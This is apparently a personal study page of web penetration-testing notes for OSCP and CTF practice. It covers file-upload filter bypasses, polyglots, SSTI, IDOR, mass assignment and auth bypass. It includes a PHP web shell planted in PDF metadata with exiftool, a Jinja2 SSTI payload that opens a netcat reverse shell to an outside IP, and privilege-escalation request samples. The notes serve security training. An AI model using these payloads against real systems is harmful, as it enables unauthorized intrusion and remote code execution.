Alt file ext (e.g <strong>.php7</strong>,<strong> .phtml</strong>, maybe <strong>.phps</strong>) </li></ul></p><p><ul><li> Content-Type Header / <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#file type spoofing">MIME Type Spoofing</a> [OSCP 190]</li></ul></p><p><ul><li>Use a polyglot</li></ul></p><p></p><p>•Add file type specific <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#Magic Bytes">header signature</a> (aka Magic Bytes).</p><p><ul><li>Use of Null Bytes.</li></ul></p><p></p><p><a name="file type spoofing"></a><h3>Content-Type Header / MIME Type Spoofing</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span>[OSCP 190]</p><p></p><p>Use Burp to manually change the listed Mime Type in the body of the POST Req, not the HTTP Header value itself. </p><p></p><p>The MIME Type that target Website is looking for may vary. For ex, could be either of the following for PDFs-</p><p></p><p><strong>Content-Type: application/pdf</strong><strong></strong></p><p><strong>Content-Type: application/x-pdf</strong></p><p></p><p>You typically can&#39;t change the <strong>Content-Type</strong> header in the Request itself if you want a working payload, but you can spoof the <strong>Content-Type</strong> field in the <a href="Recon_+_Services--WebApp--Software_64.html#Boundary (multipart) Data">multipart data</a> (if the Webserver supports that mechanism).</p><p></p><p><h3>Modifying File Extension</h3></p><p>You may need to combine multiple of these methods to bypass some filters.</p><p></p><p>More methods are listed <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#upload-tricks">here</a>.</p><p></p><p><span class="subheading">Changing Case</span>: If the site is using a case-sensitive blacklist, you can bypass it by alternating the letter case (e.g. <strong>test.pHP</strong>).</p><p></p><p><span class="subheading">Uncommon File Extensions</span>: If the site is using a blacklist, you may be able to use valid <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#defaults-extensions">alternate file extensions</a> for that language.</p><p></p><p>Some extensions may prevent server from recognizing the payload as the target file type (e.g. PHP), but you need to <span style="color:#ff0000;">try them all</span>! See <a href="https://github.com/Komodo-pty/file_uploader">Uploader</a>.</p><p></p><p>For example,</p><p></p><p><strong>.php</strong><strong></strong></p><p><strong>.php3</strong><strong></strong></p><p><strong>.php4</strong><strong></strong></p><p><strong>.php5</strong><strong></strong></p><p><strong>.php7</strong><strong></strong></p><p><strong>.pht</strong><strong></strong></p><p><strong>.phps</strong><strong></strong></p><p><strong>.phar</strong><strong></strong></p><p><strong>.phpt</strong><strong></strong></p><p><strong>.pgif</strong><strong></strong></p><p><strong>.phtml</strong><strong></strong></p><p><strong>.phtm</strong><strong></strong></p><p><strong>.inc</strong></p><p></p><p><span class="subheading">Double File Extensions</span>: Some filters only check the 1st file extension, but not the last one. However, a Web App&#39;s interpreter may only care about the last extension (i.e. <strong>test.jpg.php</strong> is treated as a PHP file).</p><p>[Wreath 135]</p><p></p><p><span class="subheading">Reverse Double Extensions</span>: Some Apache misconfigs cause any file name containing <strong>.php</strong> to be treated as a PHP file, even if it doesn&#39;t end with that extension (e.g. <strong>test.php.jpg</strong>).</p><p></p><p><span class="subheading">Null Bytes</span>: Similar concept as the Nested File Extensions, but you&#39;re using a Null Byte between the file extensions. There are <span style="color:#ff0000;">multiple variations of a Null Byte</span>, so you should <span style="color:#ff0000;">try each</span> (e.g. <strong>\x00</strong>, <strong>%00</strong>, etc).</p><p></p><p>The filter checks the last file extension, but the interpreter stops reading the file name after it hits the Null Byte. As a result, the interpreter views <strong>test.php%00.png</strong> or <strong>test.php\x00.gif</strong> as <strong>test.php</strong>.</p><p></p><p><h2>Creating Polyglot</h2></p><p>[Wreath 136-137]</p><p></p><p>There are different methods to create different types of Polyglots. You don&#39;t necessarily need to combine all of the following methods, but doing so may help in some instances.</p><p></p><p><h3>Baseline</h3></p><p>First try uploading an unmodified file of the specified type as a baseline, to confirm that upload works &amp; that you can Nav to it (unless you&#39;re going the Phishing route).</p><p></p><p>Modify 1 thing &amp; reupload to understand what is being evaluated by <a href="Recon_+_Services--WebApp_12.html">WebApp</a> (i.e <span style="color:#ff0000;">change the file ext to .php</span> but upload a normal PDF). If upload is successfull, does the image still get rendered or is it treated diff?</p><p></p><p><h3>Manipulating Metadata</h3></p><p>Not all “Tags” are compatible with each file format. May need to modify an existing tag within the metadata, instead of creating a new one.</p><p></p><p>For ex, if you cant use <strong>Comment</strong>, but target has <strong>Producer</strong>, may be able to place payload in <strong>Producer</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Does this only<span style="color:#ff0000;"> work for certain formats</span>? It worked for<strong> .jpg</strong>, but PDFs were giving me errors. Is it just the context of the specific target? Or are certain formats better suited to certain Atks?</p><p><a href="https://portswigger.net/research/portable-data-exfiltration">Code Injection in PDFs</a> &amp; the complications.</p><p></p><p>When dealing with some type of image format, incl PDFs, can view the metadata of the file &amp; then modify a Tag like-</p><p></p><p><em>exiftool FILE.pdf</em></p><p></p><p><em>exiftool -Producer=&#39;&lt;?php if(isset($_REQUEST[&quot;cmd&quot;])){echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&quot;cmd&quot;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die;}?&gt;&#39; exif.pdf</em></p><p></p><p><a name="Magic Bytes"></a><h3>Magic Bytes</h3></p><p>Different file formats have a different header signature (or Magic Bytes) at the start of a file that help the server identify the file type.</p><p></p><p>You can prepend these “Magic Bytes” to your payload to bypass some filters, without breaking your payload.</p><p></p><p><span class="subheading">PDF</span>: Add <strong><span style="color:#ff0000;">%PDF-</span></strong> to start. Not <a href="https://stackoverflow.com/questions/32178603/pdf-and-docx-magic-numbers">technically</a> the same as Magic Bytes, but some sites use it in a similar way for validation.</p><p></p><p><span class="subheading">GIF</span>: <strong><span style="color:#ff0000;">GIF89a</span></strong> is the header signature for a GIF (version 89a).</p><p></p><p>Example: GIF89a213213123<strong>PAYLOAD</strong></p><p></p><p><h2>Capture NTLM</h2></p><p>Try using UNC Path to Attacker&#39;s malicious SMB server to capture hash for a <a href="Misc_Attacks--Network_Attacks_14.html#capture ntlm">Network Attack</a></p><p></p><p><h2>XXE</h2><h2></h2></p><p><h2></h2>[Portswigger 1-12 &amp; WebApp 20-27, CTF B 145-146]<h2></h2></p><p><h2></h2></p><p>XXE can be used to fetch file contents (e.g /etc/passwd for user list &amp; then ssh keys for those users), or for RCE, SSRF, etc.</p><p><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><h2>Client-Side Attacks</h2></p><p>File Uploads can also be used for embedding malicious macros, or just manipulating a user with Phishing (e.g referencing links to malicious website, etc).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: The host used to run the <a href="Recon_+_Services--WebApp_12.html">WebApp</a> may not be the host used to view the uploaded file. For ex, uploaded files may go to a Linux Apache Server, but files may be manually reviewed on a diff Windows machine.</p><p></p><p><h3>Fingerprint Target</h3></p><p>[OSCP 73-77]</p><p></p><p>IRL need to collect as much info about target as possible. For ex, can generate a decoy PDF file using a site like canarytokens to Fingerprint a target&#39;s SW.</p><p></p><p><h3>Embed Maclicious Macro</h3></p><p>[OSCP 77-80]</p><p></p><p>Method used varies based on Target SW (i.e how are they viewing the file in question), &amp; file format used for exploitation. </p><p></p><p>Microsoft Office can be used against Windows targets opening file in Word, for ex. <a href="https://medium.com/purple-team/embedding-backdoor-into-pdf-files-1781dfce62b1">MSF</a> has module to <span style="color:#ff0000;">embed macro in Adobe Reader</span> which is very <span style="color:#ff0000;">common on all OSs</span> (module only supports Windows targets).</p><p></p><p>More detailed background on <a href="https://linuxsecurityblog.com/2018/11/12/payload-in-pdf/">malicious PDF</a> files.</p><p></p><p><a name="Upload XSS CSRF"></a><h2>XSS &amp; CSRF</h2></p><p>[CTF B 79-80 &amp; Portswigger]</p><p></p><p>Execute JS by uploading <strong>.js</strong> file or a file like <strong>.html</strong>. Sometimes, file name itself can be used for payload (instead of its contents).</p><p></p><p><a name="SSTI"></a><h1>SSTI (Server Side Template Injection)</h1></p><p>[Web App 7-15, CTF D 24-25]</p><p></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings</a> seems to have more payloads than <a href="https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection">Hacktricks</a>, but check both.</p><p></p><p>Not all payloads for a template will work in every situation. For example, a payload may let you run a command (e.g. whoami), but won&#39;t give you a Reverse Shell.</p><p></p><p>Some payloads throw <span style="color:#ff0000;">errors</span>, but these can <span style="color:#ff0000;">contain valuable information</span>!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You can try using <strong>sstimap</strong> (NOT on OSCP) for automated detection &amp; exploitation.</p><p></p><p><h2>Detection</h2></p><p>SSTI can come from various contexts, but if user input is being displayed on the page, that&#39;s a hint that a site may be vulnerable.</p><p></p><p>The most common method of detection is seeing if you can trick the site into performing multiplication, like a nerd.</p><p></p><p>See the SSTI flowchart from the aforementioned resources, but it doesn&#39;t reference every type of template!</p><p></p><p>Some templates handle the operations differently. For example, the payload <strong>{{7*&#39;7&#39;}}</strong> outputs <strong>49</strong> for Twig (treated as an integer), &amp; <strong>7777777</strong> for Jinja2 (treated as a string).</p><p></p><p><h2>Jinja2</h2></p><p><em>{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.10.249 4369 &gt;/tmp/f&#39;).read() }}</em></p><p></p><p><a name="IDOR"></a><h1>IDOR (Insecure Direct Object References)</h1></p><p>[Infrastructure 35-37]</p><p></p><p>IDOR refers to a situation where a user can manipulate the input to bypass authorization due to a lack of proper <span style="color:#ff0000;">Access Control</span>.</p><p></p><p>This can lead to Information Disclosure, acting outside of a user&#39;s intended limits, or the modification / destruction of data.</p><p></p><p>An example is when Weeve modified the number in a URL parameter for the AT&amp;T website, allowing him to view profile information for other users.</p><p></p><p><a name="Mass Assignment"></a><h1>Mass Assignment</h1></p><p>[CTF D 23]</p><p></p><p><h2>Background</h2></p><p>See the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html">OWASP Cheat Sheet</a> &amp; this <a href="https://jaxafed.github.io/posts/tryhackme-rabbit_store/#activated-account">example CTF</a>.</p><p></p><p>This vulnerability lets you “abuse an active record pattern in a Web App to <span style="color:#ff0000;">modify data values</span> that users shouldn&#39;t be able to access (e.g. passwords, permissions, or Admin status).”</p><p></p><p>For example, you can <span style="color:#ff0000;">modify</span> exiting parameters <span style="color:#ff0000;">or add</span> new <span style="color:#ff0000;">parameters</span> to a user registration <span style="color:#ff0000;">HTTP Request</span> to give yourself Admin access to the Web App. You may be able to re-enable accounts that are disabled.</p><p></p><p><strong>POST /addUser</strong><strong></strong></p><p><strong>...</strong><strong></strong></p><p><strong>userid=bobbytables&amp;password=hashedpass&amp;email=bobby@tables.com</strong><strong><span style="color:#ff0000;">&amp;isAdmin=true</span></strong></p><p></p><p></p><p><h3>Alternate Names</h3></p><p>Depending on the language/framework in question, this vulnerability can have several alternative names:</p><p><ul><li><strong>Mass Assignment</strong>: Ruby on Rails, NodeJS</li></ul></p><p><ul><li><strong>Autobinding</strong>: Spring MVC, ASP NET MVC</li></ul></p><p><ul><li><strong>Object injection</strong>: PHP</li></ul></p><p></p><p><h2>Exploitation</h2></p><p>In this example, you can create a new account but it&#39;s disabled. When logging in, you&#39;re given a <a href="Appendix_61.html#jwt">JWT</a> which you can decode to determine the sensitive fields used for account registration.</p><p></p><p><h3>Determine Field Names</h3></p><p>You may be able to guess field names &amp; values. In this case, decoding the Serialized Cookie (JWT) shows the following field:</p><p></p><p><strong>“subscription”:&quot;inactive&quot;</strong></p><p></p><p><h3>Modify Fields</h3></p><p>Use Burpsuite to intercept the account registration Request. In this case, you&#39;re adding a new field (shown in Red) to increase the permissions that this account will have.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you&#39;re adding a field to JSON data, remember to append a comma to the preceding value.</p><p></p><p><strong>{</strong><strong></strong></p><p><strong>	“email”:&quot;bob@test.com&quot;,</strong><strong></strong></p><p><strong>	“password”:&quot;test&quot;</strong><strong><span style="color:#ff0000;">,</span></strong><strong><span style="color:#ff0000;"></span></strong></p><p><strong><span style="color:#ff0000;">	“subscription”:&quot;active&quot;</span></strong><strong></strong></p><p><strong>}</strong></p><p></p><p><h1>Account Access</h1></p><p>After accessing an Account, either by signing in (e.g. <span style="color:#ff0000;">Register an Account</span> &amp; using it to sign in)or by bypassing login (e.g. SQLi or Cookie Theft), try performing the following actions.</p><p></p><p><h2>★</h2><h2>Reset Another User&#39;s Password</h2></p><p>If the Web App lets you reset your password, may be able to use Burp&#39;s <strong>Interceptor</strong> to edit the Req to change the parameter that specifies your Username / Account.</p><p></p><p>This may allow you to reset the password for another account (e.g. the Admin).</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: If you reset a user&#39;s password, you&#39;ll likely lose any chance at discovering what the OG password was. If this password was re-used elsewhere you may be locking yourself out of future attacks. It&#39;s also disruptive (low stealth)</p><p></p><p><h2>De-Obfuscate Hidden Password</h2></p><p>If you are able to access an account on a Web App without signing in (e.g. via Cookie theft or SQLi Login Bypass), you may see an obscured password listed under the Account&#39;s settings.</p><p></p><p>A password hidden with dots or *** is ONLY intended to prevent shoulder surfing.</p><p></p><p><h3>Steps</h3></p><p>It&#39;s better to use the Browser&#39;s DevTools as shown instead of just Viewing the Source Code, in the unlikely event that there are some dynamic elements that you&#39;d otherwise miss. </p><p></p><p>Right Click → <strong>Inspect</strong> ← The password is usually shown here in Clear-text</p><p></p><p><h1>Authentication Page Redirect</h1></p><p>Some resources are only intended for authenticated users, but you may still be able to identify them via methods like Fuzzing.</p><p></p><p>ffuf will likely show a blue <strong>302</strong> (Temporary Redirection) or <strong>301</strong> (Permanent Redirection) for these subdirectories.</p><p></p><p>Depending on the Web App, if you try to visit one of these subdirs without signing in, you may be redirected elsewhere (e.g. to the login pg or to a dedicated page for errors).</p><p></p><p><h2>Bypass the Redirection</h2></p><p>[CTF B 179-180]</p><p></p><p>You may be able to use burp&#39;s <strong>Repeater</strong> or <strong>Proxy</strong> (after crawling the Web App) to view the contents of these restricted pages, or even perform actions intended for logged-in users.</p><p></p><p><h3>Recon</h3></p><p>View the Source Code for these pages for sensitive info</p><p></p><p><span class="subheading">Usernames</span>: You may see some / all users on the site which you can use to BF logins (or try those to BF those usernames for others SVCs like SSH).</p><p></p><p><span class="subheading">Fingerprinting SW</span>: There may be info regarding what SW is used on the Web App, or what the version of specific SW used is.</p><p></p><p><span class="subheading">Form Actions</span>: That page may contain form fields. Take note of how those Requests are sent (e.g. which parameters are sent, &amp; to what endpoint).</p><p></p><p><h3>Broken Access Control</h3></p><p>You may be able to perform actions intended for authenticated users. For example, if it contains form fields, see if you can manually perform those actions w/o signing in. Some examples of actions you may be able to perform are as follows.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The Web App may have certain password rules which you need to follow if trying to add a new user or change an account&#39;s password.</p><p></p><p><span class="subheading">Add New User</span>: If you can create a user account, this can let you perform exploits which require Auth. You may even be able to set the permissions for this new user.</p><p></p><p><span class="subheading">Reset Password</span>: You may be able to reset the password used for an existing account.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: If you reset a user&#39;s password, you&#39;ll likely lose any chance at discovering what the OG password was. If this password was re-used elsewhere you may be locking yourself out of future attacks. It&#39;s also disruptive (low stealth)</p><p></p><p><span class="subheading">RCE / SQLi</span>: If there is a vuln <a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#sinks">sink</a>, you may be able to perform SQLi, Code / Command Injection, or get some other form of RCE.</p><p></p><p><h1>Check Cookies</h1></p><p>Cookies may <span style="color:#ff0000;">contain encoded or serialized data</span> which may prove valuable.</p><p></p><p>A Cookie may also be a <span style="color:#ff0000;">sink for Code Injection</span>, <span style="color:#ff0000;">SQLi</span>, etc.</p><p></p><p>If security is garabage, sometimes you can just directly edit a clear-text cookie to change the User or to grant access (e.g. user=admin or access=1)</p><p></p><p><h1>Anaylsing Images</h1></p><p>IRL, the most important things ask are:</p><p><ol><li>How is this image loaded? Does Networking Dev Tool catch a file path which may be vuln to something like <span style="color:#ff0000;">Dir Trav</span>?</li></ol></p><p><ol><li>What&#39;s the images <span style="color:#ff0000;">file name</span>? The name could include sensitive info like a username, pet name (for security question), etc.</li></ol></p><p><ol><li>Is there anything useful in the image <span style="color:#ff0000;">metadata</span>? Use <strong>exiftool</strong> to look for names, to fingerprint SW, etc.</li></ol></p><p><ol><li>Is there any useful info in the image? There could be an employee badge, etc.</li></ol></p><p></p><p><h2>Less Realistic Attack Vectors</h2></p><p>These are more common in CTFs &amp; probably wouldn&#39;t be relevant in a real engagement.</p><p><ol><li><a href="Appendix_61.html#Steganography">Steganography</a></li></ol></p><p><ol><li>Clear-text in the image. Run <strong>strings</strong>.</li></ol></p></div>
</body>
</html>
